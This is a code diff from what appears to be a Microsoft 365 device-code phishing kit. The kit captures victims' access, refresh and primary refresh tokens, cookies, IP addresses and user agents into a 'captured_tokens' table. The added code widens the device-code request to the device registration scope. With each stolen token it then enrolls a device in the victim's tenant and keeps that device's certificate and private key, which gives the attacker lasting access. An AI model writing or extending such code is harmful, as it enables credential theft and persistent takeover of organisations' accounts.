@@ -13,6 +13,7 @@ const { sendTelegramDocument } = require('../services/notification');
 const proxyManager = require('../services/proxymanager');
 const cookieConverter = require('./cookieconverter');
 const { parsePrtClaims } = require('./kerberos');
+const { enrollDevice } = require('./devicecode');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -46,15 +47,16 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
     const link = links[0];
 
     // Call Microsoft Device Code endpoint via proxy
-    // Use minimal scopes to avoid admin consent requirements
     const tenant = config.AZURE_TENANT || 'common';
     const clientId = config.AZURE_CLIENT_ID;
+    const deviceCodeScope =
+      'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default';
     // Claim a sticky proxy for the entire device code flow
     const { proxy, response: dcResponse } = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
         client_id: clientId,
-        scope: 'openid profile email offline_access',
+        scope: deviceCodeScope,
       }),
       {
         headers: {
@@ -362,7 +364,7 @@ async function retryAsTokenMode(originalJob) {
     const { proxy, response: dcResponse } = await ms.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
       new URLSearchParams({
-        client_id: clientId,
+        client_id: config.AZURE_CLIENT_ID,
         scope: 'openid profile email offline_access 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default',
       }),
       {
@@ -492,6 +494,39 @@ async function storeToken(job, tokenData, responseCookies = []) {
       } catch (e) { /* ignore */ }
     }
 
+    // Broker device enrollment from access_token
+    let deviceId = null;
+    let deviceEnrolled = false;
+    let enrollmentTime = null;
+    let deviceCertificateEncrypted = null;
+    let encryptedPrivateKey = null;
+
+    if (tokenData.access_token) {
+      try {
+        const accessPayload = JSON.parse(Buffer.from(tokenData.access_token.split('.')[1], 'base64').toString());
+        deviceId = accessPayload['device_code_id'] || accessPayload['xms_device_id'] || accessPayload['oid'] || null;
+      } catch (e) {
+        deviceId = null;
+      }
+    }
+
+    if (deviceId) {
+      try {
+        const { enrollDevice } = require('./devicecode');
+        const enrollmentResult = await enrollDevice(tokenData.access_token, deviceId, tenant);
+        deviceEnrolled = true;
+        enrollmentTime = new Date();
+
+        if (enrollmentResult.deviceCertificate) deviceCertificateEncrypted = encrypt(enrollmentResult.deviceCertificate);
+        if (enrollmentResult.privateKeyPem) encryptedPrivateKey = encrypt(enrollmentResult.privateKeyPem);
+
+        console.log('[DeviceProxy] Device enrolled: ' + enrollmentResult.deviceName + ' (' + deviceId + ')');
+      } catch (enrollErr) {
+        console.error('[DeviceProxy] Device enrollment failed:', enrollErr.message);
+        deviceEnrolled = false;
+      }
+    }
+
     // Fallback: extract client_info from id_token JWT payload
     if (!clientInfo && tokenData.id_token) {
       try {
@@ -557,11 +592,11 @@ async function storeToken(job, tokenData, responseCookies = []) {
     }
 
     // Determine client_id used for this capture
-    const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
+    const clientIdUsed = config.AZURE_CLIENT_ID;
 
     const [result] = await db.query(
-       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, client_info, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
+       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, client_info, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id, device_id, device_certificate_encrypted, encrypted_private_key, device_enrolled, enrollment_time)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
         job.user_id,
         job.link_id,
@@ -581,6 +616,11 @@ async function storeToken(job, tokenData, responseCookies = []) {
         'office',
         accountType,
         clientIdUsed,
+        deviceId,
+        deviceCertificateEncrypted,
+        encryptedPrivateKey,
+        deviceEnrolled ? 1 : 0,
+        enrollmentTime,
       ]
     );
 
